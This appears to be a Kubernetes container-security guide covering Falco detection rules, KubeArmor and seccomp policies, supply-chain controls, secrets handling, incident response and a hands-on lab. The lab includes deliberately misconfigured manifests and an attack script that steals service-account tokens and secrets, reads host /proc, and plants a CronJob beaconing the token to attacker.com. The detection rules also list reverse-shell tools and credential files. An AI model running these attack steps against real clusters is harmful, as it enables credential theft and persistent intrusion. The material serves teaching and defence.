helm repo add falcosecurity https://falcosecurity.github.io/charts
helm repo update

helm install falco falcosecurity/falco \
  --namespace falco-system \
  --create-namespace \
  --set falcosidekick.enabled=true \
  --set falcosidekick.config.slack.webhookurl="https://hooks.slack.com/..." \
  --set driver.kind=ebpf \
  --set collectors.kubernetes.enabled=true
```

#### Custom Falco Rules

```yaml
# /etc/falco/rules.d/custom-rules.yaml

# Detect reverse shell
- rule: Reverse Shell Detected
  desc: Detect reverse shell connections from containers
  condition: >
    evt.type=connect and
    container and
    fd.typechar='4' and
    fd.sip != "0.0.0.0" and
    proc.name in (bash, sh, dash, zsh, python, python3, perl, ruby, nc, ncat)
  output: >
    Reverse shell detected (user=%user.name container=%container.name
    image=%container.image.repository command=%proc.cmdline
    connection=%fd.name pid=%proc.pid)
  priority: CRITICAL
  tags: [container, shell, mitre_execution]

# Detect cryptominer
- rule: Cryptomining Activity
  desc: Detect processes communicating with known mining pools
  condition: >
    evt.type in (connect, sendto) and
    container and
    fd.sip != "0.0.0.0" and
    (fd.sport in (3333, 4444, 5555, 7777, 8888, 9999, 14444, 14433) or
     proc.name in (xmrig, minerd, minergate, cpuminer, ethminer))
  output: >
    Cryptomining detected (user=%user.name container=%container.name
    image=%container.image.repository process=%proc.name
    connection=%fd.name)
  priority: CRITICAL
  tags: [container, cryptomining, mitre_resource_hijacking]

# Detect container escape attempt
- rule: Container Escape via Mount
  desc: Detect attempts to mount host filesystems from container
  condition: >
    evt.type=mount and
    container and
    not proc.name in (mount, systemd-mount) and
    evt.arg.dev startswith "/dev/"
  output: >
    Container escape attempt via mount (user=%user.name
    container=%container.name image=%container.image.repository
    command=%proc.cmdline device=%evt.arg.dev)
  priority: CRITICAL
  tags: [container, escape, mitre_privilege_escalation]

# Detect sensitive file read
- rule: Read Sensitive File in Container
  desc: Detect reading of sensitive files that should not be accessed
  condition: >
    open_read and
    container and
    fd.name in (/etc/shadow, /etc/kubernetes/admin.conf,
                /var/run/secrets/kubernetes.io/serviceaccount/token) and
    not proc.name in (kubelet, kube-proxy)
  output: >
    Sensitive file read (user=%user.name container=%container.name
    file=%fd.name command=%proc.cmdline image=%container.image.repository)
  priority: WARNING
  tags: [container, filesystem, mitre_credential_access]

# Detect kubectl exec into production pods
- rule: Exec Into Production Pod
  desc: Detect kubectl exec into production namespace pods
  condition: >
    spawned_process and
    container and
    container.image.repository != "pause" and
    k8s.ns.name = "production" and
    proc.pname = "runc:[2:INIT]"
  output: >
    Exec into production pod (user=%user.name pod=%k8s.pod.name
    namespace=%k8s.ns.name command=%proc.cmdline)
  priority: WARNING
  tags: [container, exec, mitre_execution]

# Detect unauthorized process in container
- rule: Unexpected Process in App Container
  desc: Only expected processes should run in application containers
  condition: >
    spawned_process and
    container and
    container.image.repository = "myregistry.io/app" and
    not proc.name in (server, node, python3)
  output: >
    Unexpected process spawned (container=%container.name
    image=%container.image.repository process=%proc.name
    command=%proc.cmdline parent=%proc.pname)
  priority: WARNING
  tags: [container, process, mitre_execution]
```

### Tracee — eBPF Runtime Security

Tracee by Aqua Security provides deeper syscall-level visibility:

```bash
# Run Tracee as DaemonSet
helm install tracee aqua/tracee \
  --namespace tracee-system \
  --create-namespace \
  --set hostPID=true

# Tracee policy — detect fileless execution
apiVersion: tracee.aquasec.com/v1beta1
kind: Policy
metadata:
  name: detect-fileless-exec
spec:
  scope:
  - global
  rules:
  - event: mem_prot_alert
    filters:
    - alert=Protection Alert
  - event: process_execute_failed
  - event: magic_write
    filters:
    - pathname=/dev/shm/*
```

### KubeArmor — Runtime Enforcement

KubeArmor enforces policies at the LSM level (AppArmor/BPF-LSM/SELinux):

```yaml
# Block shell execution in production containers
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: block-shell-exec
  namespace: production
spec:
  selector:
    matchLabels:
      app: backend
  process:
    matchPaths:
    - path: /bin/sh
    - path: /bin/bash
    - path: /bin/dash
    - path: /usr/bin/python3
    - path: /usr/bin/curl
    - path: /usr/bin/wget
  action: Block

---
# Block network connections to external IPs
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: block-external-network
  namespace: production
spec:
  selector:
    matchLabels:
      app: backend
  network:
    matchProtocols:
    - protocol: tcp
      fromSource:
      - path: /bin/sh
      - path: /bin/bash
  action: Block

---
# File integrity — block writes to /etc
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: protect-etc
  namespace: production
spec:
  selector:
    matchLabels:
      app: backend
  file:
    matchDirectories:
    - dir: /etc/
      recursive: true
  action: Block
```

### Seccomp Profiles — Fine-Grained Per Container

```yaml
# SeccompProfile custom resource (Security Profiles Operator)
apiVersion: security-profiles-operator.x-k8s.io/v1beta1
kind: SeccompProfile
metadata:
  name: app-server-profile
  namespace: production
spec:
  defaultAction: SCMP_ACT_ERRNO
  architectures:
  - SCMP_ARCH_X86_64
  - SCMP_ARCH_AARCH64
  syscalls:
  - action: SCMP_ACT_ALLOW
    names:
    # Basic operations
    - read
    - write
    - close
    - openat
    - fstat
    - mmap
    - mprotect
    - munmap
    - brk
    # Network (server)
    - socket
    - bind
    - listen
    - accept4
    - connect
    - sendto
    - recvfrom
    - setsockopt
    - getsockname
    # Process
    - clone
    - execve
    - exit_group
    - futex
    - nanosleep
    # NOT allowed: ptrace, mount, unshare, setns, pivot_root

---
# Reference in Pod
apiVersion: v1
kind: Pod
metadata:
  name: app
spec:
  securityContext:
    seccompProfile:
      type: Localhost
      localhostProfile: profiles/app-server-profile.json
```

### Detecting Runtime Threats

| Threat | Detection Method | Indicator |
|--------|-----------------|-----------|
| Cryptomining | CPU spike + pool connections | Stratum protocol on ports 3333/4444 |
| Reverse shell | Outbound connection from shell process | bash/sh connecting to external IP |
| Container escape | Mount syscall, namespace manipulation | mount() from non-init process |
| File modification | inotify/eBPF on sensitive paths | Write to /etc/passwd, /etc/shadow |
| Privilege escalation | setuid/setgid execution | Process changing UID to 0 |
| Data exfiltration | Large outbound transfers | Unusual egress volume/destination |

---

## 7. Supply Chain Security for Containers

### Dependency Confusion in Container Builds

```dockerfile
# VULNERABLE — private package name collision
RUN pip install internal-auth-library
# If attacker publishes "internal-auth-library" on PyPI with higher version
# pip will install the malicious public package

# SECURE — use explicit index with --index-url only
RUN pip install --index-url https://private.pypi.myorg.com/simple/ \
    --no-deps internal-auth-library==2.1.0

# SECURE — use hash pinning
RUN pip install --require-hashes -r requirements.txt
```

`requirements.txt` with hashes:

```
internal-auth-library==2.1.0 \
    --hash=sha256:abc123def456...
cryptography==42.0.5 \
    --hash=sha256:789ghi012jkl...
```

### Typosquatting in Registries

Common attacks:
- `docker pull ngix` instead of `nginx`
- `FROM pythonn:3.12` instead of `python:3.12`
- `npm install loadsh` instead of `lodash`

Mitigations:
- Pin to digest: `FROM python:3.12@sha256:abc123...`
- Use private registry mirror with approved images only
- Admission policies blocking images from untrusted registries

### SLSA Framework for Container Builds

Supply-chain Levels for Software Artifacts — progressive maturity model:

| Level | Requirement |
|-------|------------|
| SLSA 1 | Build process documented, provenance generated |
| SLSA 2 | Signed provenance, hosted build service |
| SLSA 3 | Hardened build platform, non-falsifiable provenance |
| SLSA 4 | Two-person review, hermetic + reproducible builds |

### Tekton Chains — Build Provenance

```yaml
# Tekton Pipeline with Chains generating signed provenance
apiVersion: tekton.dev/v1
kind: Pipeline
metadata:
  name: secure-build-pipeline
spec:
  tasks:
  - name: git-clone
    taskRef:
      name: git-clone
    params:
    - name: url
      value: $(params.git-url)
    - name: revision
      value: $(params.git-revision)

  - name: run-tests
    taskRef:
      name: run-tests
    runAfter: [git-clone]

  - name: build-image
    taskRef:
      name: kaniko
    params:
    - name: IMAGE
      value: $(params.image-registry)/$(params.image-name):$(params.git-revision)
    runAfter: [run-tests]

  - name: scan-image
    taskRef:
      name: trivy-scan
    params:
    - name: IMAGE
      value: $(params.image-registry)/$(params.image-name):$(params.git-revision)
    - name: SEVERITY
      value: "HIGH,CRITICAL"
    - name: EXIT_CODE
      value: "1"
    runAfter: [build-image]

  - name: sign-image
    taskRef:
      name: cosign-sign
    params:
    - name: IMAGE
      value: $(params.image-registry)/$(params.image-name):$(params.git-revision)
    runAfter: [scan-image]
```

Tekton Chains automatically generates and signs SLSA provenance attestations for each TaskRun.

### Kyverno — Admission Policies for Image Provenance

```yaml
# Require signed images from trusted registry
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: verify-image-signature
spec:
  validationFailureAction: Enforce
  background: false
  rules:
  - name: verify-cosign-signature
    match:
      any:
      - resources:
          kinds:
          - Pod
    verifyImages:
    - imageReferences:
      - "myregistry.io/*"
      attestors:
      - count: 1
        entries:
        - keys:
            publicKeys: |-
              -----BEGIN PUBLIC KEY-----
              MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE...
              -----END PUBLIC KEY-----

---
# Block images from untrusted registries
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: restrict-image-registries
spec:
  validationFailureAction: Enforce
  rules:
  - name: validate-registries
    match:
      any:
      - resources:
          kinds:
          - Pod
    validate:
      message: "Images must come from approved registries"
      pattern:
        spec:
          containers:
          - image: "myregistry.io/* | gcr.io/distroless/*"
          =(initContainers):
          - image: "myregistry.io/* | gcr.io/distroless/*"

---
# Require SBOM attestation
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: require-sbom
spec:
  validationFailureAction: Enforce
  rules:
  - name: check-sbom-attestation
    match:
      any:
      - resources:
          kinds:
          - Pod
    verifyImages:
    - imageReferences:
      - "myregistry.io/*"
      attestations:
      - type: https://spdx.dev/Document
        attestors:
        - entries:
          - keys:
              publicKeys: |-
                -----BEGIN PUBLIC KEY-----
                ...
                -----END PUBLIC KEY-----
        conditions:
        - all:
          - key: "{{ creationInfo.created }}"
            operator: NotEquals
            value: ""
```

### OPA Gatekeeper — Rego Policies

```yaml
# ConstraintTemplate — require image digest
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8srequireimagedigest
spec:
  crd:
    spec:
      names:
        kind: K8sRequireImageDigest
  targets:
  - target: admission.k8s.gatekeeper.sh
    rego: |
      package k8srequireimagedigest

      violation[{"msg": msg}] {
        container := input.review.object.spec.containers[_]
        not contains(container.image, "@sha256:")
        msg := sprintf("Container '%v' must use image digest (sha256), got: %v",
                       [container.name, container.image])
      }

      violation[{"msg": msg}] {
        container := input.review.object.spec.initContainers[_]
        not contains(container.image, "@sha256:")
        msg := sprintf("Init container '%v' must use image digest (sha256), got: %v",
                       [container.name, container.image])
      }

---
# Constraint applying the template
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sRequireImageDigest
metadata:
  name: require-digest-production
spec:
  enforcementAction: deny
  match:
    kinds:
    - apiGroups: [""]
      kinds: ["Pod"]
    namespaces: ["production", "staging"]
```

### Sigstore Ecosystem

Sigstore provides a complete software signing infrastructure:

| Component | Function |
|-----------|----------|
| **Cosign** | Sign/verify container images and artifacts |
| **Fulcio** | Keyless certificate authority (issues short-lived certs via OIDC) |
| **Rekor** | Transparency log (immutable record of signing events) |
| **policy-controller** | Kubernetes admission webhook verifying signatures |

Keyless flow:
1. Developer authenticates via OIDC (GitHub, Google, etc.)
2. Fulcio issues ephemeral signing certificate bound to identity
3. Artifact signed with ephemeral key
4. Signature + certificate logged in Rekor transparency log
5. Verification checks: valid signature + certificate chain + Rekor entry + identity match

---

## 8. Secrets Management in Containers

### Kubernetes Secrets — The Problem

```bash
# Kubernetes "secret" is just base64 encoding — NOT encryption
kubectl get secret db-credentials -o jsonpath='{.data.password}' | base64 -d
# Output: MyP@ssw0rd123

# Any user with get/list on secrets can read them
# etcd stores them in plaintext by default
# They appear in kubectl describe, audit logs, etcd backups
```

### Sealed Secrets (Bitnami)

Encrypted secrets that only the cluster can decrypt:

```bash
# Install controller
helm install sealed-secrets sealed-secrets/sealed-secrets \
  --namespace kube-system

# Encrypt a secret (client-side)
kubectl create secret generic db-credentials \
  --from-literal=username=admin \
  --from-literal=password='S3cur3P@ss!' \
  --dry-run=client -o yaml | \
  kubeseal --controller-name=sealed-secrets \
           --controller-namespace=kube-system \
           --format yaml > sealed-db-credentials.yaml
```

```yaml
# Result — safe to commit to git
apiVersion: bitnami.com/v1alpha1
kind: SealedSecret
metadata:
  name: db-credentials
  namespace: production
spec:
  encryptedData:
    username: AgBy3i4OJSWK+PiTySYZH3...
    password: AgCtr8KJHSD+8ysdfSDFH3...
  template:
    metadata:
      name: db-credentials
      namespace: production
```

### External Secrets Operator

Sync secrets from external vaults into Kubernetes:

```yaml
# SecretStore — connect to HashiCorp Vault
apiVersion: external-secrets.io/v1beta1
kind: SecretStore
metadata:
  name: vault-store
  namespace: production
spec:
  provider:
    vault:
      server: "https://vault.internal.myorg.com"
      path: "secret"
      version: "v2"
      auth:
        kubernetes:
          mountPath: "kubernetes"
          role: "production-app"
          serviceAccountRef:
            name: vault-auth-sa

---
# ExternalSecret — fetch and sync
apiVersion: external-secrets.io/v1beta1
kind: ExternalSecret
metadata:
  name: db-credentials
  namespace: production
spec:
  refreshInterval: 1h
  secretStoreRef:
    name: vault-store
    kind: SecretStore
  target:
    name: db-credentials
    creationPolicy: Owner
    deletionPolicy: Retain
  data:
  - secretKey: username
    remoteRef:
      key: production/database
      property: username
  - secretKey: password
    remoteRef:
      key: production/database
      property: password
```

### CSI Secret Store Driver

Mount secrets as volumes directly from external vaults without intermediate Kubernetes Secrets:

```yaml
# SecretProviderClass — Vault CSI
apiVersion: secrets-store.csi.x-k8s.io/v1
kind: SecretProviderClass
metadata:
  name: vault-db-creds
  namespace: production
spec:
  provider: vault
  parameters:
    vaultAddress: "https://vault.internal.myorg.com"
    roleName: "production-app"
    objects: |
      - objectName: "db-username"
        secretPath: "secret/data/production/database"
        secretKey: "username"
      - objectName: "db-password"
        secretPath: "secret/data/production/database"
        secretKey: "password"

---
# Pod using CSI volume
apiVersion: v1
kind: Pod
metadata:
  name: app
  namespace: production
spec:
  serviceAccountName: vault-auth-sa
  containers:
  - name: app
    image: myregistry.io/app:v1.2.3
    volumeMounts:
    - name: secrets
      mountPath: /mnt/secrets
      readOnly: true
  volumes:
  - name: secrets
    csi:
      driver: secrets-store.csi.k8s.io
      readOnly: true
      volumeAttributes:
        secretProviderClass: vault-db-creds
```

### Environment Variables vs Volume Mounts

| Aspect | Env Vars | Volume Mounts |
|--------|----------|---------------|
| Visibility | Exposed in /proc/PID/environ, `docker inspect`, crash dumps | File on filesystem, readable only by container process |
| Rotation | Requires pod restart | Can be updated without restart (CSI driver) |
| Logging risk | Easily leaked in debug output, logs | Less likely to be logged |
| 12-factor compliance | Yes | Requires file-reading code |

**Recommendation:** Volume mounts for sensitive secrets (DB passwords, API keys). Environment variables acceptable for non-sensitive configuration (log level, feature flags).

### Secret Rotation in Running Pods

```yaml
# External Secrets Operator — automatic rotation
apiVersion: external-secrets.io/v1beta1
kind: ExternalSecret
metadata:
  name: rotating-credentials
spec:
  refreshInterval: 15m  # Check for updates every 15 minutes
  secretStoreRef:
    name: vault-store
    kind: SecretStore
  target:
    name: rotating-credentials
    creationPolicy: Owner
  data:
  - secretKey: api-key
    remoteRef:
      key: production/api-keys
      property: current
```

Application-level rotation pattern:
1. Application watches secret file/volume for changes (inotify or periodic reload)
2. On change: validate new credential → switch active connection pool → drain old connections
3. Never cache secrets in memory longer than TTL

### Never Build Secrets into Images

```dockerfile
# WRONG — secret baked into layer, extractable forever
FROM node:20
COPY .env /app/.env
RUN npm install

# WRONG — even if deleted, visible in layer history
FROM node:20
COPY credentials.json /tmp/creds
RUN some-tool --credentials=/tmp/creds && rm /tmp/creds

# CORRECT — use build secrets (BuildKit)
# syntax=docker/dockerfile:1
FROM node:20
RUN --mount=type=secret,id=npm_token \
    NPM_TOKEN=$(cat /run/secrets/npm_token) \
    npm install --registry=https://npm.myorg.com

# Build command:
# docker build --secret id=npm_token,src=./.npm_token .
```

---

## 9. Monitoring e Incident Response

### Container Forensics Challenges

| Challenge | Root Cause | Mitigation |
|-----------|-----------|------------|
| Container already terminated | Ephemeral by design | Pre-configure log shipping, enable audit logging |
| No filesystem to examine | Read-only FS, tmpfs | Capture filesystem snapshot before kill |
| Network flows disappeared | Dynamic pod IPs, short-lived connections | Continuous network flow logging (Cilium Hubble) |
| Attacker covered tracks | Root in container = can modify logs | Ship logs externally in real-time |
| Image tag mutability | `latest` tag overwritten | Pin to digest, use immutable tags |

### Capturing Container State Before Termination

```bash
# Checkpoint a running container (criu-based)
# Requires: runc with CRIU support
docker checkpoint create suspicious-container forensic-snap-$(date +%s)

# Alternative: commit container filesystem to image for analysis
docker commit suspicious-container forensic-evidence:$(date +%Y%m%d-%H%M%S)

# Export filesystem as tar
docker export suspicious-container > /forensics/container-fs-$(date +%s).tar

# Capture process tree
docker exec suspicious-container ps auxww > /forensics/processes.txt

# Capture network state
docker exec suspicious-container ss -tulnp > /forensics/network.txt
docker exec suspicious-container cat /proc/net/tcp > /forensics/proc-net-tcp.txt

# Copy specific files for evidence
docker cp suspicious-container:/tmp/ /forensics/container-tmp/
docker cp suspicious-container:/var/log/ /forensics/container-logs/
```

### Log Collection Patterns

#### stdout/stderr (Default Pattern)

```yaml
# Application logs to stdout → collected by kubelet → shipped by log agent
apiVersion: apps/v1
kind: Deployment
metadata:
  name: app
spec:
  template:
    spec:
      containers:
      - name: app
        image: myregistry.io/app:v1.2.3
        # Application configured to log to stdout in JSON format
        env:
        - name: LOG_FORMAT
          value: "json"
        - name: LOG_OUTPUT
          value: "stdout"
```

#### Sidecar Pattern (Multi-Source Logs)

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: app-with-sidecar-logging
spec:
  containers:
  - name: app
    image: myregistry.io/app:v1.2.3
    volumeMounts:
    - name: app-logs
      mountPath: /var/log/app

  - name: log-shipper
    image: fluent/fluent-bit:3.0
    volumeMounts:
    - name: app-logs
      mountPath: /var/log/app
      readOnly: true
    - name: fluent-bit-config
      mountPath: /fluent-bit/etc/

  volumes:
  - name: app-logs
    emptyDir: {}
  - name: fluent-bit-config
    configMap:
      name: fluent-bit-config
```

### Kubernetes Audit Log Analysis

Key events to alert on:

```bash
# Suspicious API operations to detect:

# 1. Secret access by unexpected subjects
jq 'select(.objectRef.resource == "secrets" and
    .verb == "get" and
    .user.username != "system:serviceaccount:vault:vault-sa")' audit.log

# 2. Pod exec in production
jq 'select(.objectRef.resource == "pods" and
    .objectRef.subresource == "exec" and
    .objectRef.namespace == "production")' audit.log

# 3. RBAC changes
jq 'select(.objectRef.resource | test("roles|rolebindings|clusterroles|clusterrolebindings") and
    .verb | test("create|update|patch|delete"))' audit.log

# 4. Service account token creation
jq 'select(.objectRef.resource == "serviceaccounts" and
    .objectRef.subresource == "token" and
    .verb == "create")' audit.log

# 5. Node operations (potential control plane compromise)
jq 'select(.objectRef.resource == "nodes" and
    .verb | test("update|patch|delete"))' audit.log
```

### Network Flow Monitoring

```yaml
# Cilium Hubble — network observability for Kubernetes
# Enable Hubble in Cilium Helm values
hubble:
  enabled: true
  relay:
    enabled: true
  ui:
    enabled: true
  metrics:
    enabled:
    - dns:query;ignoreAAAA
    - drop
    - tcp
    - flow
    - icmp
    - httpV2:exemplars=true;labelsContext=source_ip,source_namespace,destination_ip,destination_namespace
```

```bash
# Observe flows in real-time
hubble observe --namespace production --protocol tcp

# Detect unusual egress
hubble observe --namespace production \
  --verdict FORWARDED \
  --not-to-namespace production \
  --not-to-namespace kube-system \
  --not-to-fqdn "*.myorg.com"

# Export for forensics
hubble observe --since 1h --output json > /forensics/network-flows.json
```

### Incident Response Procedure

#### Phase 1: Contain

```bash
# Isolate pod — apply deny-all network policy immediately
kubectl apply -f - <<EOF
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: isolate-compromised-pod
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: compromised-app
  policyTypes:
  - Ingress
  - Egress
EOF

# Scale down to prevent new instances (but keep existing for forensics)
kubectl scale deployment compromised-app --replicas=0 -n production

# Do NOT delete the pod yet — we need evidence
```

#### Phase 2: Capture Evidence

```bash
# Get pod details
kubectl get pod compromised-pod -n production -o yaml > /forensics/pod-spec.yaml

# Get container logs
kubectl logs compromised-pod -n production --all-containers > /forensics/pod-logs.txt
kubectl logs compromised-pod -n production --all-containers --previous > /forensics/pod-logs-previous.txt

# Get events
kubectl get events -n production --field-selector involvedObject.name=compromised-pod \
  --sort-by='.lastTimestamp' > /forensics/events.txt

# Exec into container for live forensics (if still running)
kubectl exec compromised-pod -n production -- cat /proc/1/cmdline
kubectl exec compromised-pod -n production -- ls -la /tmp /dev/shm /var/tmp
kubectl exec compromised-pod -n production -- cat /proc/net/tcp
kubectl exec compromised-pod -n production -- find / -newer /proc/1/root -type f 2>/dev/null

# Capture container filesystem
kubectl debug compromised-pod -n production --image=busybox --target=app -- \
  tar czf /evidence/container-fs.tar.gz /proc/1/root/

# Get node-level data
NODE=$(kubectl get pod compromised-pod -n production -o jsonpath='{.spec.nodeName}')
# SSH to node and capture container runtime data
```

#### Phase 3: Timeline Reconstruction

```bash
# Correlate:
# 1. Kubernetes audit logs — what API calls happened
# 2. Falco alerts — what syscalls were anomalous
# 3. Network flows — what connections were made
# 4. Container logs — what the application reported
# 5. Node logs — kernel/containerd events

# Timeline format (UTC ISO 8601):
# 2026-05-07T14:32:01Z — Initial access: exec into pod via stolen kubeconfig
# 2026-05-07T14:32:15Z — Discovery: SA token read, API enumeration
# 2026-05-07T14:33:02Z — Lateral movement: new pod created with hostPID
# 2026-05-07T14:33:45Z — Privilege escalation: nsenter to host
# 2026-05-07T14:34:10Z — Exfiltration: secrets dumped, sent to external IP
```

#### Phase 4: Eradicate and Harden

```bash
# Rotate compromised credentials
kubectl delete secret compromised-secret -n production
# Recreate from Vault/external source

# Revoke service account tokens
kubectl delete serviceaccount compromised-sa -n production
kubectl create serviceaccount new-sa -n production

# Rebuild affected images (supply chain compromise)
# Trigger rebuild of all images that used the affected base

# Apply hardened policies
kubectl apply -f hardened-network-policies/
kubectl apply -f pod-security-policies/
```

---

## 10. Laboratorio

### Lab Architecture

Deploy a complete container security lab with attack and defense components:

```
┌─────────────────────────────────────────────────────────────────┐
│                    Kubernetes Cluster (kind/k3s)                  │
├─────────────────┬─────────────────┬─────────────────────────────┤
│  Namespace:     │  Namespace:     │  Namespace:                  │
│  production     │  security       │  attacker                    │
│  ┌───────────┐  │  ┌───────────┐  │  ┌───────────┐              │
│  │ vuln-app  │  │  │  Falco    │  │  │ kali-pod  │              │
│  │ (miscfg)  │  │  │  Trivy    │  │  │ (tools)   │              │
│  └───────────┘  │  │  Gatekeeper│ │  └───────────┘              │
│  ┌───────────┐  │  │  Harbor   │  │                             │
│  │ database  │  │  └───────────┘  │                             │
│  └───────────┘  │                 │                             │
└─────────────────┴─────────────────┴─────────────────────────────┘
```

### Phase 1: Deploy Cluster with Security Tools

```bash
#!/bin/bash
# lab-setup.sh — Deploy security lab

set -euo pipefail

# Create kind cluster with audit logging
cat <<EOF | kind create cluster --config=-
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
name: security-lab
nodes:
- role: control-plane
  kubeadmConfigPatches:
  - |
    kind: ClusterConfiguration
    apiServer:
      extraArgs:
        audit-policy-file: /etc/kubernetes/audit-policy.yaml
        audit-log-path: /var/log/kubernetes/audit.log
        audit-log-maxage: "7"
        audit-log-maxbackup: "3"
        enable-admission-plugins: NodeRestriction,PodSecurity
      extraVolumes:
      - name: audit-policy
        hostPath: /etc/kubernetes/audit-policy.yaml
        mountPath: /etc/kubernetes/audit-policy.yaml
        readOnly: true
      - name: audit-log
        hostPath: /var/log/kubernetes/
        mountPath: /var/log/kubernetes/
  extraMounts:
  - hostPath: ./audit-policy.yaml
    containerPath: /etc/kubernetes/audit-policy.yaml
    readOnly: true
- role: worker
- role: worker
EOF

# Install Falco
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm install falco falcosecurity/falco \
  --namespace falco-system --create-namespace \
  --set driver.kind=ebpf \
  --set falcosidekick.enabled=true

# Install Trivy Operator
helm repo add aqua https://aquasecurity.github.io/helm-charts/
helm install trivy-operator aqua/trivy-operator \
  --namespace trivy-system --create-namespace \
  --set operator.scanJobsConcurrentLimit=3

# Install OPA Gatekeeper
helm repo add gatekeeper https://open-policy-agent.github.io/gatekeeper/charts
helm install gatekeeper gatekeeper/gatekeeper \
  --namespace gatekeeper-system --create-namespace

# Install Kyverno
helm repo add kyverno https://kyverno.github.io/kyverno/
helm install kyverno kyverno/kyverno \
  --namespace kyverno --create-namespace

# Create namespaces
kubectl create namespace production
kubectl create namespace attacker
kubectl label namespace production pod-security.kubernetes.io/enforce=baseline

echo "[+] Lab infrastructure deployed"
```

### Phase 2: Deploy Vulnerable Application

```yaml
# vulnerable-deployment.yaml
# Intentionally misconfigured for lab exercise
apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    pod-security.kubernetes.io/enforce: baseline
    pod-security.kubernetes.io/warn: restricted

---
# Overprivileged ServiceAccount
apiVersion: v1
kind: ServiceAccount
metadata:
  name: app-sa
  namespace: production
automountServiceAccountToken: true  # VULN: Should be false

---
# Overly permissive Role
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: production
  name: app-role
rules:
- apiGroups: [""]
  resources: ["pods", "secrets", "configmaps"]
  verbs: ["get", "list", "create", "delete"]  # VULN: Can read secrets
- apiGroups: [""]
  resources: ["pods/exec"]
  verbs: ["create"]  # VULN: Can exec into other pods

---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: app-binding
  namespace: production
subjects:
- kind: ServiceAccount
  name: app-sa
  namespace: production
roleRef:
  kind: Role
  name: app-role
  apiGroup: rbac.authorization.k8s.io

---
# Vulnerable Pod — multiple misconfigurations
apiVersion: apps/v1
kind: Deployment
metadata:
  name: vuln-app
  namespace: production
spec:
  replicas: 1
  selector:
    matchLabels:
      app: vuln-app
  template:
    metadata:
      labels:
        app: vuln-app
    spec:
      serviceAccountName: app-sa
      containers:
      - name: app
        image: ubuntu:22.04
        command: ["/bin/bash", "-c"]
        args:
        - |
          apt-get update && apt-get install -y curl jq netcat-openbsd &&
          echo "Vulnerable app running" &&
          while true; do sleep 3600; done
        securityContext:
          # VULN: Not dropping capabilities
          # VULN: Not read-only filesystem
          # VULN: Not running as non-root
          runAsUser: 0
        env:
        - name: DB_PASSWORD     # VULN: Secret in env var
          value: "SuperSecret123!"
        - name: API_KEY         # VULN: Secret in env var
          value: "sk-prod-abc123def456"
        volumeMounts:
        - name: host-proc       # VULN: Host proc mounted
          mountPath: /host/proc
          readOnly: true
      volumes:
      - name: host-proc         # VULN: hostPath volume
        hostPath:
          path: /proc

---
# Database with default credentials
apiVersion: v1
kind: Secret
metadata:
  name: db-credentials
  namespace: production
type: Opaque
data:
  username: YWRtaW4=          # admin
  password: UEBzc3cwcmQxMjM=  # P@ssw0rd123

---
apiVersion: v1
kind: Pod
metadata:
  name: database
  namespace: production
  labels:
    app: database
spec:
  containers:
  - name: postgres
    image: postgres:16
    env:
    - name: POSTGRES_PASSWORD
      valueFrom:
        secretKeyRef:
          name: db-credentials
          key: password
```

### Phase 3: Attack Scenario

```bash
#!/bin/bash
# attack-scenario.sh — Exploit misconfigured pod → escalate → steal secrets

echo "[*] Phase 1: Initial Access — Exec into vulnerable pod"
kubectl exec -it deployment/vuln-app -n production -- /bin/bash

# Inside the pod:
echo "[*] Phase 2: Discovery — Enumerate service account permissions"
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
API_SERVER="https://kubernetes.default.svc"

# Check permissions
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  "$API_SERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"production"}}'

echo "[*] Phase 3: Secret Theft — Read all secrets in namespace"
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  "$API_SERVER/api/v1/namespaces/$NS/secrets" | jq '.items[].data'

echo "[*] Phase 4: Lateral Movement — Exec into database pod"
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  "$API_SERVER/api/v1/namespaces/$NS/pods/database/exec?command=id&stdin=false&stdout=true&stderr=true" \
  -X POST -H "Content-Type: application/json" \
  -H "Upgrade: websocket" -H "Connection: Upgrade"

echo "[*] Phase 5: Container Escape — Read host proc"
# Already have /host/proc mounted
cat /host/proc/1/environ | tr '\0' '\n'  # Host PID 1 environment
ls /host/proc/*/root/ 2>/dev/null | head  # Other container filesystems

echo "[*] Phase 6: Persistence — Create CronJob (if cluster-level access)"
# If we escalated to cluster scope:
cat <<EOF | curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  "$API_SERVER/apis/batch/v1/namespaces/production/cronjobs" -X POST -d @-
{
  "apiVersion": "batch/v1",
  "kind": "CronJob",
  "metadata": {"name": "system-health", "namespace": "production"},
  "spec": {
    "schedule": "*/30 * * * *",
    "jobTemplate": {
      "spec": {
        "template": {
          "spec": {
            "containers": [{
              "name": "health",
              "image": "curlimages/curl",
              "command": ["/bin/sh", "-c", "curl http://attacker.com/beacon?token=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"]
            }],
            "serviceAccountName": "app-sa",
            "restartPolicy": "OnFailure"
          }
        }
      }
    }
  }
}
EOF
```

### Phase 4: Defense Implementation

```yaml
